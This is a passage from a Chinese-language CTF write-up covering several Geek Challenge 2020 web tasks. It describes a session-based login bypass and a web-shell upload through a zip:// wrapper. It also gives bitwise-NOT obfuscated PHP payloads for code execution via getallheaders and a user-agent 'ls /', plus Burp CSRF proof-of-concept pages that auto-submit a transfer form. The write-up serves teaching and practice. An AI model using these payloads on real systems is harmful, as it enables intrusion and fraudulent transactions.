class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/?page=admin/user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-validate&quot;</span> <span class="attr">id</span>=<span class="string">&quot;loginFrom&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;login-username&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">required</span> <span class="attr">data-msg</span>=<span class="string">&quot;请输入用户名&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;用户名&quot;</span> <span class="attr">class</span>=<span class="string">&quot;input-material&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;login-password&quot;</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">required</span> <span class="attr">data-msg</span>=<span class="string">&quot;请输入密码&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;密码&quot;</span> <span class="attr">class</span>=<span class="string">&quot;input-material&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;login&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin-top: -40px;&quot;</span>&gt;</span> </span><br><span class="line">                    	<span class="comment">&lt;!-- &lt;input type=&quot;checkbox&quot;  id=&quot;check1&quot;/&gt;&amp;nbsp;&lt;span&gt;记住密码&lt;/span&gt;</span></span><br><span class="line"><span class="comment">                    	&lt;input type=&quot;checkbox&quot; id=&quot;check2&quot;/&gt;&amp;nbsp;&lt;span&gt;自动登录&lt;/span&gt; --&gt;</span></span><br><span class="line">                    	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;custom-control custom-checkbox &quot;</span> <span class="attr">style</span>=<span class="string">&quot;float: right;&quot;</span>&gt;</span></span><br><span class="line">											    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">class</span>=<span class="string">&quot;custom-control-input&quot;</span> <span class="attr">id</span>=<span class="string">&quot;check2&quot;</span> &gt;</span></span><br><span class="line">											    <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">&quot;custom-control-label&quot;</span> <span class="attr">for</span>=<span class="string">&quot;check2&quot;</span>&gt;</span>自动登录<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">											<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">											<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;custom-control custom-checkbox &quot;</span> <span class="attr">style</span>=<span class="string">&quot;float: right;&quot;</span>&gt;</span></span><br><span class="line">											    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">class</span>=<span class="string">&quot;custom-control-input&quot;</span> <span class="attr">id</span>=<span class="string">&quot;check1&quot;</span> &gt;</span></span><br><span class="line">											    <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">&quot;custom-control-label&quot;</span> <span class="attr">for</span>=<span class="string">&quot;check1&quot;</span>&gt;</span>记住密码<span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">											<span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">small</span>&gt;</span>没有账号?<span class="tag">&lt;/<span class="name">small</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;signup&quot;</span>&gt;</span><span class="symbol">&amp;nbsp;</span>不给注册<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- JavaScript files--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://libs.baidu.com/jquery/1.10.2/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://ajax.aspnetcdn.com/ajax/bootstrap/4.2.1/bootstrap.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;vendor/jquery-validation/jquery.validate.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="comment">&lt;!--表单验证--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Main File--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/front.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">require_once(&quot;secret.php&quot;);</span></span><br><span class="line"><span class="meta">mt_srand($secret_seed);</span></span><br><span class="line"><span class="meta">$_SESSION[&#x27;password&#x27;] = mt_rand();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//secret.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$secret_seed</span> = <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//admin/user</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$logined</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&quot;Longlone&quot;</span> <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>])&#123;  <span class="comment">// No one knows my password, including myself</span></span><br><span class="line">		<span class="variable">$logined</span> = <span class="literal">true</span>;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;status&#x27;</span>] = <span class="variable">$logined</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$logined</span> === <span class="literal">false</span> &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;status&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;status&#x27;</span>] !== <span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;username or password not correct!&#x27;);window.location.href=&#x27;index.php?page=login&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>最后一个是我没想到的，尽管看着不像文件，但是还是读取出来了emm</p>
+<p>这里我们分析一下代码，需要让username&#x3D;Longlone，然后密码的话是session中password的值，也就是经过随机后的值，那我们怎么去拿到password的值呢？</p>
+<p>碰撞基本上是不可能的，我们把cookie中的值删除，令password为空，那我们的username对应的password为空的话就可以绕过验证了，但是好像必须输入密码，那我们把密码对应的HTML中 required 属性规定必需在提交之前填写输入字段。直接找到它把它删了，然后就成功登录了</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250111135849147.png" alt="image-20250111135849147"></p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250111135917811.png" alt="image-20250111135917811"></p>
+<p>发现一个上传头像的地方，看看是不是文件上传漏洞</p>
+<p>发现可以上传，那我们这里可以将php文件打包成zip，改后缀名为jpg，再利用<code>zip</code>伪协议进行读取。zip协议是可以解压缩jpg后缀的压缩包的。</p>
+<p>先写一个木马文件，然后用zip压缩转成jpg文件后缀进行上传，上传成功后进行访问发现并不能看到图片(是因为我们这个文件是个压缩包，不是个正常的图片)</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250111141307731.png" alt="image-20250111141307731"></p>
+<p>利用zip伪协议读取一下</p>
+<p>zip:&#x2F;&#x2F; + zip路径 + %23 + php文件名</p>
+<p>这里用%23去把源码中自动接上的php后缀去掉，然后传入参数执行命令就可以了</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250111142218492.png" alt="image-20250111142218492"></p>
+<h1 id="web-Rceme"><a href="#web-Rceme" class="headerlink" title="web-Rceme"></a>web-Rceme</h1><p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250111204504679.png" alt="image-20250111204504679"></p>
+<p>打开是一个命令执行界面</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250111204539582.png" alt="image-20250111204539582"></p>
+<p>可以看到里面有提示Do you know vim swp，意思是vim缓存信息泄露，访问.index.php.swp可以得到缓存文件，可以看到页面源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>] = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>().<span class="title function_ invoke__">sha1</span>(mt_rand)),<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">        <span class="comment">//获得验证数字</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]),<span class="number">0</span>,<span class="number">5</span>) !== <span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>])&#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;Captcha error~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>] = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>().<span class="title function_ invoke__">sha1</span>(mt_rand)),<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">        <span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &gt; <span class="number">70</span> <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/ixm&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                <span class="comment">//修正符:x 将模式中的空白忽略; </span></span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;Longlone not like you~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<p>简单来说就是</p>
+<p>1.code经过md5加密后的前5个字符要等于session 的code</p>
+<p>2.cmd长度不能超过70且不能被正则匹配到</p>
+<p>3.匹配括号内的内容替换成空格后结果为;</p>
+<p>使用的方法就是无数字字母rce，如果是函数套用的话只能满足第三个条件而不能满足第二个条件，所以我们只能用无数字字母rce的方法去实现函数套用</p>
+<p>无数字字母rce的话就是自增，取反，异或三种方法，但是自增的话可能满足不了长度的要求，异或的符号被过滤了，所以我们试一下取反去进行函数套用</p>
+<p>首先要通过第一个判断句</p>
+<h2 id="哈希运算"><a href="#哈希运算" class="headerlink" title="哈希运算"></a>哈希运算</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib<span class="comment">#用于进行哈希运算。MD5 是一种常用的哈希算法之一。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000000000000</span>):</span><br><span class="line">    m=hashlib.md5(<span class="built_in">str</span>(i).encode()).hexdigest()<span class="comment">#计算字符串的 MD5 哈希值，并将结果转换为十六进制的字符串表示</span></span><br><span class="line">    <span class="keyword">if</span> m[<span class="number">0</span>:<span class="number">5</span>]==<span class="string">&#x27;cfc86&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)<span class="comment">#如果找到符合条件的 i，则打印该整数。</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>运行结果</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250120234859048.png" alt="image-20250120234859048"></p>
+<p>可以得出252796的结果，也就是我们的code要传的参数，然后我们就用取反去进行rce</p>
+<p>先试一下phpinfo()</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250120231630388.png" alt="image-20250120231630388"></p>
+<p>在响应包中可以看到我们的php版本，在PHP7中支持这种调用方法，因此支持这么写(‘phpinfo’)();例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;phpinfo&#x27;][0]()</span><br><span class="line">[&#x27;phpinfo&#x27;]&#123;0&#125;()</span><br></pre></td></tr></table></figure>
+
+<p>也都是可以的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpinfo(): [~%8F%97%8F%96%91%99%90][~%CF]();</span><br></pre></td></tr></table></figure>
+
+<p>加这个[<del>%FF]只是因为php7的解析方式，当然换成其他的也可以例如[</del>%EF] [~%CF]</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250120235942784.png" alt="image-20250120235942784"></p>
+<p>rce没成功，后面才知道是session的值交包后会更新，后面改了之后整了几次就整出来了</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250121000217160.png" alt="image-20250121000217160"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(getallheaders());</span><br></pre></td></tr></table></figure>
+
+<p><code>getallheaders()</code> 函数用于获取当前请求的所有 HTTP 头信息。</p>
+<p>因为有长度限制，不然想直接执行ls命令的函数套用来着</p>
+<p>因为ua头可控，所以我们这里可以通过ua去进行rce</p>
+<p>贴一个取反的脚本</p>
+<h2 id="取反脚本poc"><a href="#取反脚本poc" class="headerlink" title="取反脚本poc"></a>取反脚本poc</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ans1</span>=<span class="string">&#x27;getallheaders&#x27;</span>;<span class="comment">//函数名</span></span><br><span class="line"><span class="variable">$data1</span>=(<span class="string">&#x27;~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$ans1</span>));<span class="comment">//通过两次取反运算得到结果</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="string">&#x27;(&#x27;</span>.<span class="variable">$data1</span>.<span class="string">&#x27;)&#x27;</span>.<span class="string">&#x27;;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>payload就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[~%89%9E%8D%A0%9B%8A%92%8F][~%CF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][~%CF]());</span><br><span class="line">user-agent: ls /</span><br></pre></td></tr></table></figure>
+
+<p>看看ua头在哪个位置，但是好像我的ua头不在第二个位置，所以网上的wp用var_dump(next(getallheaders());打不了，重开靶机后也是这样，反正思路是对的</p>
+<h1 id="flagshop"><a href="#flagshop" class="headerlink" title="flagshop"></a>flagshop</h1><h2 id="CSRF跨站请求伪造"><a href="#CSRF跨站请求伪造" class="headerlink" title="#CSRF跨站请求伪造"></a>#CSRF跨站请求伪造</h2><p>注册后登录在主页底下找到购买flag的按钮，但是显示钱不够</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250217233813121.png" alt="image-20250217233813121"></p>
+<p>然后在转账里面看到转账的入口，试着给自己转钱但是不可行</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250217234027610.png" alt="image-20250217234027610"></p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250218124923898-1739854166953-1.png" alt="image-20250218124923898"></p>
+<p>后来看了wp才知道题目可以利用<code>CSRF</code>漏洞进行攻击，但是需要自己写一个页面让后台点击，接着会自动跳转到转账页面，让服务器以为是后台转账操作。</p>
+<p>假如我们写了一个恶意页面并提交报告上传，后台就会点击我们的报告，而我们页面的内容会进行自动跳转到转账页面，那接下来我们就写一下我们自己的CSRF恶意网页(这里是用的bp里的CSRF的poc)</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://52235d31-9522-47f0-9ea9-8508a7a151f0.node5.buuoj.cn:81/transfer.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span>//设置我们URL的表单提交</span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;target&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--创建输入控件的 HTML 标签，允许用户输入数据,但是type属性设置字段类型为hidden，表示字段隐藏，也就是说，用户无法直接看到或修改这个字段的值--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;money&quot;</span> <span class="attr">value</span>=<span class="string">&quot;100000000000&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;messages&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">      <span class="comment">&lt;!--这里意味着当我们提交报告的时候后台点击报告后会自动利用管理员身份提交表单进行转账，并做了一个隐藏的行为--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://52235d31-9522-47f0-9ea9-8508a7a151f0.node5.buuoj.cn:81/transfer.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;target&quot;</span> <span class="attr">value</span>=<span class="string">&quot;qwasd&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;money&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1000000000000000000000000000000000000000000000000000000&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;messages&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> <span class="attr">id</span>=<span class="string">&quot;onclick_1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;onclick_1&quot;</span>).<span class="title function_">click</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
